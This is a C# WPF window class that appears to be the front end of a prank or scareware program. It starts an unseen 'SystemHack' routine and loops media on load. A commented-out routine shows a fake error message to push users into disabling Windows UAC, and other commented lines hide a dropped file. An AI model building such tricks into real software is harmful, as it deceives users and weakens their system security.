using System;
using System.Windows;
using System.Windows.Input;
using System.IO;
using System.ComponentModel;

namespace Nuclear
{
    /// <summary>
    /// <see cref="MainWindow"/>.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            //CheckUAC();
            InitializeComponent();
        }
        //You can set your cancel condition
        private void Window_Closing(object sender, CancelEventArgs e)
        {
            if (File.Exists("filename")) File.Delete("filename");
            SystemHack.Disactivate(); //discard system hack
            System.Threading.Thread.Sleep(1000); 
            Application.Current.Shutdown();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {  
            try
            {
                //you need to add video-media into Resource.resx file
                if (File.Exists("filename")) File.Delete("filename");
                //File.WriteAllBytes("filename", Resource.filename);
                //File.SetAttributes("filename", FileAttributes.Hidden);
                SystemHack.Activate(); //system hack
                MedEl.Play(); //first media play
            }
            catch (Exception)
            {
                Application.Current.Shutdown();
            }
        }
        private void MedEl_MediaEnded(object sender, RoutedEventArgs e)
        {
            //looping media
            MedEl.Stop();
            MedEl.Play();
        }
        /*private void CheckUAC() //ask user to disable UAC :)
         {
             Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
             string state = Convert.ToString(reg.GetValue("EnableLua"));
             if (state == "1")
             {
                 MessageBox.Show("Error!", "Error!", MessageBoxButton.OK);
                 Application.Current.Shutdown();
             }
             else return;
         }*/
    }
}